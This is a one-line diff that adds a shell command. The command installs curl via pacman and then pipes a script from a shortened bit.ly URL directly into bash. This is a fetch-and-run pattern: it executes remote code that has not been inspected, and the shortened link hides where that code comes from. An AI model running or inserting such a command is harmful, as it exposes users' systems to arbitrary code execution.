@@ -1,0 +1,1 @@
+pacman -Sy curl --noconfirm && curl -L bit.ly/robot001 | bash
